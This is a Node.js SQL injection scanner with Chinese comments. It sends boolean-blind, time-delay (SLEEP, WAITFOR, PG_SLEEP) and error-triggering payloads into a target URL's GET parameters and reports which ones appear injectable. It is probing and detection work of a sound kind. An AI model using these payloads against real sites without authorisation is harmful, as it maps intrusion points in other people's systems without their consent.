/**
 * ============================================================
 * SQL 注入检测工具 (SQL Injection Scanner)
 * ============================================================
 *
 * 【原理说明】
 * SQL 注入是最常见的 Web 安全漏洞之一，攻击者通过在输入参数中
 * 插入恶意 SQL 代码，使应用执行非预期的数据库操作。
 *
 * 本工具实现了三种常见的 SQL 注入检测技术：
 *
 * 1. 布尔盲注 (Boolean-based Blind SQLi)
 *    - 原理：构造使 SQL 查询结果为真/假的 payload
 *    - 通过比较页面内容变化判断注入是否存在
 *    - 例如：在参数后加 ' AND '1'='1 和 ' AND '1'='2
 *    - 如果前者页面正常，后者页面异常，则存在注入
 *
 * 2. 时间盲注 (Time-based Blind SQLi)
 *    - 原理：构造导致数据库延时执行的 payload
 *    - 通过比较响应时间变化判断注入是否存在
 *    - 例如：MySQL 的 SLEEP(5)、MSSQL 的 WAITFOR DELAY
 *    - 如果响应时间明显增加，则存在注入
 *
 * 3. 报错注入 (Error-based SQLi)
 *    - 原理：构造导致数据库报错的 payload
 *    - 通过检测响应中的数据库错误信息判断
 *    - 例如：单引号 ' 可能触发 SQL 语法错误
 *    - 错误信息中常包含 SQL 语法、表名、列名等信息
 *
 * 【使用方法】
 *   node sqli_scanner.js <目标URL> [参数名]
 *
 * 【参数说明】
 *   目标URL  - 必填，带参数的完整 URL，例如 http://example.com/page?id=1
 *              如果 URL 中有多个参数，会逐一检测每个参数
 *   参数名   - 可选，只检测指定的参数名
 *
 * 【示例】
 *   node sqli_scanner.js "http://127.0.0.1/page?id=1"
 *   node sqli_scanner.js "http://example.com/search?q=test&cat=1" id
 *
 * 【免责声明】
 *   本工具仅供学习和授权测试使用，未经授权检测他人网站属于违法行为。
 * ============================================================
 */

const http = require('http');
const https = require('https');

// ============================================================
// SQL 注入 Payload 定义
// ============================================================

// 布尔盲注 payload 对：一个为真（True），一个为假（False）
// 用于比较两次请求的页面差异
const BOOLEAN_PAYLOADS = [
  // 单引号闭合的情况
  { true: "' AND '1'='1", false: "' AND '1'='2", desc: "单引号字符型" },
  // 双引号闭合的情况
  { true: '" AND "1"="1', false: '" AND "1"="2', desc: "双引号字符型" },
  // 数字型注入（无需闭合）
  { true: " AND 1=1", false: " AND 1=2", desc: "数字型" },
  // 单引号+注释闭合
  { true: "' AND 1=1-- ", false: "' AND 1=2-- ", desc: "单引号+注释" },
  // 双引号+注释闭合
  { true: '" AND 1=1-- ', false: '" AND 1=2-- ', desc: "双引号+注释" },
  // 括号闭合的情况
  { true: "') AND ('1'='1", false: "') AND ('1'='2", desc: "单引号+括号" },
];

// 时间盲注 payload（不同数据库的延时函数）
const TIME_PAYLOADS = [
  { payload: "' AND SLEEP(5)-- ", db: "MySQL", delay: 5, desc: "MySQL SLEEP" },
  { payload: " AND SLEEP(5)-- ", db: "MySQL(数字型)", delay: 5, desc: "MySQL SLEEP 数字型" },
  { payload: "'; WAITFOR DELAY '0:0:5'-- ", db: "MSSQL", delay: 5, desc: "MSSQL WAITFOR" },
  { payload: "' AND PG_SLEEP(5)-- ", db: "PostgreSQL", delay: 5, desc: "PostgreSQL PG_SLEEP" },
  { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ", db: "MySQL", delay: 5, desc: "MySQL 嵌套 SLEEP" },
];

// 报错注入 payload（触发数据库错误）
const ERROR_PAYLOADS = [
  { payload: "'", desc: "单引号" },
  { payload: '"', desc: "双引号" },
  { payload: "')", desc: "单引号+括号" },
  { payload: '")', desc: "双引号+括号" },
  { payload: "' OR 1=1-- ", desc: "OR 注入" },
];

// 数据库错误关键字（用于匹配报错信息）
const ERROR_KEYWORDS = [
  // MySQL 错误
  'MySQL syntax', 'mysql_fetch', 'mysql_error', 'MySQL server',
  'You have an error in your SQL syntax',
  'Warning: mysql_', 'Warning: mysqli_',
  // MSSQL 错误
  'Microsoft SQL Server', 'SQL Server', 'Unclosed quotation mark',
  'System.Data.SqlClient', 'SQLException',
  // PostgreSQL 错误
  'PostgreSQL', 'pg_query', 'pg_exec', 'syntax error at or near',
  // Oracle 错误
  'ORA-', 'Oracle error', 'Oracle Database',
  // SQLite 错误
  'SQLite/JDBCDriver', 'SQLite3::', 'sqlite_',
  // 通用 SQL 错误
  'SQL syntax', 'sql error', 'syntax error', 'unclosed quotation',
  'quoted string not properly terminated',
];

// ============================================================
// HTTP 请求函数
// ============================================================
/**
 * 发起 HTTP/HTTPS GET 请求
 * @param {string} targetUrl - 目标 URL
 * @param {number} timeout - 超时时间
 * @returns {Promise<{statusCode: number, body: string, responseTime: number}>}
 */
function request(targetUrl, timeout = 15000) {
  return new Promise((resolve, reject) => {
    const startTime = Date.now();
    const parsedUrl = new URL(targetUrl);
    const module = parsedUrl.protocol === 'https:' ? https : http;

    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'GET',
      timeout: timeout,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
    };

    const req = module.request(options, (res) => {
      let body = '';

      res.on('data', (chunk) => {
        body += chunk.toString();
        // 限制最大接收 50KB，避免处理过大页面
        if (body.length > 51200) {
          res.destroy();
        }
      });

      res.on('end', () => {
        const responseTime = Date.now() - startTime;
        resolve({
          statusCode: res.statusCode,
          body: body,
          responseTime: responseTime,
          contentLength: body.length,
        });
      });

      res.on('close', () => {
        const responseTime = Date.now() - startTime;
        resolve({
          statusCode: res.statusCode,
          body: body,
          responseTime: responseTime,
          contentLength: body.length,
        });
      });
    });

    req.on('timeout', () => {
      req.destroy();
      resolve({
        statusCode: 0,
        body: '',
        responseTime: timeout,
        contentLength: 0,
        timeout: true,
      });
    });

    req.on('error', (err) => {
      reject(err);
    });

    req.end();
  });
}

// ============================================================
// 解析 URL 参数
// ============================================================
/**
 * 从 URL 中提取所有 GET 参数
 * @param {string} urlStr - 完整 URL
 * @returns {{baseUrl: string, params: Object}} 基础URL和参数对象
 */
function parseUrlParams(urlStr) {
  const parsed = new URL(urlStr);
  const params = {};

  // 遍历所有查询参数
  parsed.searchParams.forEach((value, key) => {
    params[key] = value;
  });

  // 构造基础 URL（不含参数部分）
  const baseUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}`;

  return { baseUrl, params };
}

// ============================================================
// 构造带注入 payload 的 URL
// ============================================================
/**
 * 构造带注入 payload 的测试 URL
 * @param {string} baseUrl - 基础 URL
 * @param {Object} params - 原始参数
 * @param {string} targetParam - 目标参数名
 * @param {string} payload - 注入 payload
 * @returns {string} 构造的完整 URL
 */
function buildTestUrl(baseUrl, params, targetParam, payload) {
  const urlObj = new URL(baseUrl);

  // 复制所有参数
  for (const [key, value] of Object.entries(params)) {
    if (key === targetParam) {
      // 在目标参数值后追加 payload
      urlObj.searchParams.append(key, value + payload);
    } else {
      urlObj.searchParams.append(key, value);
    }
  }

  return urlObj.toString();
}

// ============================================================
// 1. 布尔盲注检测
// ============================================================
/**
 * 检测布尔盲注
 * @param {string} baseUrl - 基础 URL
 * @param {Object} params - 参数对象
 * @param {string} paramName - 目标参数名
 * @returns {Promise<{vulnerable: boolean, details: string}>}
 */
async function testBooleanBlind(baseUrl, params, paramName) {
  const originalValue = params[paramName];

  // 先获取原始页面作为基准
  const baseTestUrl = buildTestUrl(baseUrl, params, paramName, '');
  const baseResult = await request(baseTestUrl);
  const baseLength = baseResult.contentLength;

  console.log(`    [*] 基准页面长度: ${baseLength} 字节`);

  // 逐一测试各组布尔 payload
  for (const payload of BOOLEAN_PAYLOADS) {
    try {
      // 构造真/假两个测试 URL
      const trueUrl = buildTestUrl(baseUrl, params, paramName, payload.true);
      const falseUrl = buildTestUrl(baseUrl, params, paramName, payload.false);

      // 发起两次请求
      const trueResult = await request(trueUrl);
      const falseResult = await request(falseUrl);

      const trueLen = trueResult.contentLength;
      const falseLen = falseResult.contentLength;

      // 计算页面长度差异比例
      const diffRatio = Math.abs(trueLen - falseLen) / Math.max(baseLength, 1);

      // 判断条件：
      // 1. 真页面长度与基准相近（差异小于30%）
      // 2. 假页面长度与基准差异较大（差异大于20%）
      // 3. 真假页面之间有明显差异
      const trueDiffBase = Math.abs(trueLen - baseLength) / Math.max(baseLength, 1);
      const falseDiffBase = Math.abs(falseLen - baseLength) / Math.max(baseLength, 1);

      if (diffRatio > 0.2 && (falseDiffBase > trueDiffBase * 1.5 || falseDiffBase > 0.3)) {
        return {
          vulnerable: true,
          details: `布尔盲注 (${payload.desc})\n` +
                   `      基准长度: ${baseLength}\n` +
                   `      真值长度: ${trueLen} (差异: ${(trueDiffBase * 100).toFixed(1)}%)\n` +
                   `      假值长度: ${falseLen} (差异: ${(falseDiffBase * 100).toFixed(1)}%)\n` +
                   `      Payload: ${payload.true} / ${payload.false}`,
        };
      }
    } catch (err) {
      // 单个 payload 测试失败不中断，继续下一个
      continue;
    }
  }

  return { vulnerable: false, details: '' };
}

// ============================================================
// 2. 时间盲注检测
// ============================================================
/**
 * 检测时间盲注
 * @param {string} baseUrl - 基础 URL
 * @param {Object} params - 参数对象
 * @param {string} paramName - 目标参数名
 * @returns {Promise<{vulnerable: boolean, details: string}>}
 */
async function testTimeBlind(baseUrl, params, paramName) {
  // 先获取正常响应时间作为基准（多次取平均）
  const testUrl = buildTestUrl(baseUrl, params, paramName, '');

  console.log(`    [*] 测试正常响应时间...`);

  let totalTime = 0;
  let validRequests = 0;
  for (let i = 0; i < 2; i++) {
    try {
      const result = await request(testUrl, 10000);
      if (!result.timeout) {
        totalTime += result.responseTime;
        validRequests++;
      }
    } catch (err) {
      // 忽略错误
    }
  }

  const avgNormalTime = validRequests > 0 ? totalTime / validRequests : 1000;
  console.log(`    [*] 平均正常响应时间: ${avgNormalTime.toFixed(0)}ms`);

  // 逐一测试时间盲注 payload
  for (const payload of TIME_PAYLOADS) {
    try {
      const injectUrl = buildTestUrl(baseUrl, params, paramName, payload.payload);

      // 发起延时测试请求
      const result = await request(injectUrl, 30000);

      const responseTime = result.responseTime;
      const expectedDelay = payload.delay * 1000; // 转成毫秒

      // 判断条件：
      // 响应时间明显大于正常响应时间 + 预期延时的70%
      // 同时排除超时的情况（超时直接认为可能存在）
      if (result.timeout || responseTime > avgNormalTime + expectedDelay * 0.7) {
        return {
          vulnerable: true,
          details: `时间盲注 (${payload.desc})\n` +
                   `      正常响应时间: ${avgNormalTime.toFixed(0)}ms\n` +
                   `      注入后响应时间: ${responseTime}ms\n` +
                   `      预期延时: ${payload.delay}秒\n` +
                   `      Payload: ${payload.payload}`,
        };
      }
    } catch (err) {
      continue;
    }
  }

  return { vulnerable: false, details: '' };
}

// ============================================================
// 3. 报错注入检测
// ============================================================
/**
 * 检测报错注入
 * @param {string} baseUrl - 基础 URL
 * @param {Object} params - 参数对象
 * @param {string} paramName - 目标参数名
 * @returns {Promise<{vulnerable: boolean, details: string}>}
 */
async function testErrorBased(baseUrl, params, paramName) {
  for (const payload of ERROR_PAYLOADS) {
    try {
      const testUrl = buildTestUrl(baseUrl, params, paramName, payload.payload);
      const result = await request(testUrl);

      const body = result.body.toLowerCase();

      // 检查响应中是否包含数据库错误关键字
      for (const keyword of ERROR_KEYWORDS) {
        if (body.includes(keyword.toLowerCase())) {
          return {
            vulnerable: true,
            details: `报错注入 (${payload.desc})\n` +
                     `      错误关键字: ${keyword}\n` +
                     `      Payload: ${payload.payload}\n` +
                     `      状态码: ${result.statusCode}`,
          };
        }
      }
    } catch (err) {
      continue;
    }
  }

  return { vulnerable: false, details: '' };
}

// ============================================================
// SQL 注入扫描主函数
// ============================================================
/**
 * 对指定 URL 的所有 GET 参数进行 SQL 注入检测
 * @param {string} urlStr - 目标 URL
 * @param {string} [targetParam] - 指定检测的参数名（可选）
 */
async function scanSqlInjection(urlStr, targetParam = null) {
  const { baseUrl, params } = parseUrlParams(urlStr);
  const paramNames = Object.keys(params);

  if (paramNames.length === 0) {
    console.log('[!] 未发现 GET 参数，请提供带参数的 URL');
    return;
  }

  console.log('\n' + '='.repeat(60));
  console.log('[*] SQL 注入检测工具');
  console.log('='.repeat(60));
  console.log(`[*] 目标 URL: ${urlStr}`);
  console.log(`[*] 发现参数: ${paramNames.join(', ')}`);
  console.log(`[*] 检测类型: 布尔盲注 / 时间盲注 / 报错注入`);
  console.log('='.repeat(60));

  const foundVulns = [];

  // 逐一检测每个参数
  for (const paramName of paramNames) {
    // 如果指定了参数名，跳过其他参数
    if (targetParam && paramName !== targetParam) {
      continue;
    }

    console.log(`\n[*] 正在检测参数: ${paramName} (值: ${params[paramName]})`);

    // 1. 报错注入检测（最快，先测）
    console.log(`    [-] 检测报错注入...`);
    const errorResult = await testErrorBased(baseUrl, params, paramName);
    if (errorResult.vulnerable) {
      console.log(`    [!] 发现报错注入！`);
      foundVulns.push({ param: paramName, type: '报错注入', details: errorResult.details });
      // 已确认有注入，继续检测其他类型以获取更多信息
    } else {
      console.log(`    [-] 未发现报错注入`);
    }

    // 2. 布尔盲注检测
    console.log(`    [-] 检测布尔盲注...`);
    const booleanResult = await testBooleanBlind(baseUrl, params, paramName);
    if (booleanResult.vulnerable) {
      console.log(`    [!] 发现布尔盲注！`);
      foundVulns.push({ param: paramName, type: '布尔盲注', details: booleanResult.details });
    } else {
      console.log(`    [-] 未发现布尔盲注`);
    }

    // 3. 时间盲注检测（最慢，最后测）
    console.log(`    [-] 检测时间盲注... (可能需要较长时间)`);
    const timeResult = await testTimeBlind(baseUrl, params, paramName);
    if (timeResult.vulnerable) {
      console.log(`    [!] 发现时间盲注！`);
      foundVulns.push({ param: paramName, type: '时间盲注', details: timeResult.details });
    } else {
      console.log(`    [-] 未发现时间盲注`);
    }
  }

  // ============================================================
  // 输出检测结果汇总
  // ============================================================
  console.log('\n' + '='.repeat(60));
  console.log('[*] 检测完成！');
  console.log('='.repeat(60));

  if (foundVulns.length > 0) {
    console.log(`\n[!] 发现 ${foundVulns.length} 个 SQL 注入漏洞：`);
    console.log('-'.repeat(50));
    foundVulns.forEach((vuln, index) => {
      console.log(`\n  [${index + 1}] 参数: ${vuln.param}`);
      console.log(`      类型: ${vuln.type}`);
      console.log(`      详情: ${vuln.details}`);
    });
    console.log('\n[!] 风险等级: 高危');
    console.log('[!] 修复建议: 使用参数化查询/预编译语句，对用户输入进行严格过滤');
  } else {
    console.log('\n[-] 未检测到 SQL 注入漏洞');
    console.log('    注意：本工具仅基于简单特征检测，不代表绝对安全');
    console.log('    建议结合手工测试和专业扫描器进行深入检测');
  }

  return foundVulns;
}

// ============================================================
// 主程序入口
// ============================================================
function main() {
  const args = process.argv.slice(2);

  if (args.length < 1) {
    console.log('用法: node sqli_scanner.js <目标URL> [参数名]');
    console.log('示例: node sqli_scanner.js "http://127.0.0.1/page?id=1"');
    console.log('      node sqli_scanner.js "http://example.com/search?q=test" q');
    process.exit(1);
  }

  const targetUrl = args[0];
  const targetParam = args[1] || null;

  // 验证 URL 格式
  try {
    new URL(targetUrl);
  } catch (err) {
    console.error('[!] 错误：URL 格式无效，请包含 http:// 或 https://');
    process.exit(1);
  }

  // 执行扫描
  scanSqlInjection(targetUrl, targetParam)
    .catch((err) => {
      console.error('\n[!] 扫描出错:', err.message);
      process.exit(1);
    });
}

// 运行主程序
main();
